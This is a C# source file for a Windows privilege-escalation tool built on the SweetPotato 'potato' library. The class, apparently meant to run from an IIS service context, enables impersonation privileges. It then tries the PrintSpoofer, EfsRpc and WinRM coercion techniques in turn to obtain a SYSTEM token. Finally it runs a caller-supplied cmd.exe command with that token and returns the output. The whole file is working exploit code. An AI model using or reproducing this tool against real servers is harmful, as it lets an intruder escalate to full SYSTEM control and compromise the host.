using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using static SweetPotato.ImpersonationToken;
using SweetPotato;

namespace SystemIIS
{
    class IIS
    {
        private string result = "";
        public string GetResult()
        {
            return this.result;
        }

        public IIS(string cmd)
        {
            string clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
            ushort port = 6666;
            string program = @"c:\Windows\System32\cmd.exe";
            string programArgs = cmd;
            ExecutionMethod executionMethod = ExecutionMethod.Auto;
            PotatoAPI.Mode mode = PotatoAPI.Mode.PrintSpoofer;
            bool flag = false;


            try
            {
                bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);
                bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);
                bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);

                if (!hasImpersonate && !hasPrimary)
                {
                    result = "necessary privileges missing";
                    return;
                }

                executionMethod = ExecutionMethod.Token;
                mode = PotatoAPI.Mode.PrintSpoofer;

                PotatoAPI potatoAPI = new PotatoAPI(new Guid(clsId), port, mode);

                if (!potatoAPI.Trigger())
                {
                    mode = PotatoAPI.Mode.EfsRpc;
                    potatoAPI = new PotatoAPI(new Guid(clsId), port, mode);
                    if (!potatoAPI.Trigger())
                    {
                        mode = PotatoAPI.Mode.WinRM;
                        potatoAPI = new PotatoAPI(new Guid(clsId), port, mode);
                        if (!potatoAPI.Trigger())
                        {
                            result = "Spooler: failed | EfsRPC: failed | WinRM: failed";
                            return;
                        }
                    }
                }

                SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
                saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
                saAttr.bInheritHandle = 0x1;
                saAttr.lpSecurityDescriptor = IntPtr.Zero;

                if (!CreatePipe(ref out_read, ref out_write, ref saAttr, 0))
                {
                    result = "CreatePipe failed";
                    return;
                }

                SetHandleInformation(out_read, HANDLE_FLAG_INHERIT, 0);
                SetHandleInformation(err_read, HANDLE_FLAG_INHERIT, 0);
                Thread systemThread = new Thread(() =>
                {
                    SetThreadToken(IntPtr.Zero, potatoAPI.Token);
                    STARTUPINFO si = new STARTUPINFO();
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = @"WinSta0\Default";
                    si.hStdOutput = out_write;
                    si.hStdError = err_write;
                    si.dwFlags |= STARTF_USESTDHANDLES;

                    string finalArgs = null;

                    if (programArgs != null)
                    {
                        programArgs = "/c " + programArgs;
                        finalArgs = string.Format("\"{0}\" {1}", program, programArgs);
                    }

                    if (executionMethod == ExecutionMethod.Token)
                    {
                        flag = CreateProcessWithTokenW(potatoAPI.Token, 0, program, finalArgs, (CreationFlags)0x08000000, IntPtr.Zero, null, ref si, out pi);
                        if (!flag)
                        {
                            result = "Failed to created impersonated process with token";
                        }
                        
                    }

                    CloseHandle(out_write);
                    byte[] buf = new byte[BUFSIZE];
                    int dwRead = 0;
                    StringBuilder r = new StringBuilder();
                    while (ReadFile(out_read, buf, BUFSIZE, ref dwRead, IntPtr.Zero))
                    {
                        byte[] outBytes = new byte[dwRead];
                        Array.Copy(buf, outBytes, dwRead);
                        r.Append(Encoding.Default.GetString(outBytes));

                    }
                    CloseHandle(out_read);
                    result = r.ToString();
                });

                systemThread.Start();
                systemThread.Join();
            }
            catch (Exception e)
            {
                result = e.Message;
            }
        }
    }
}
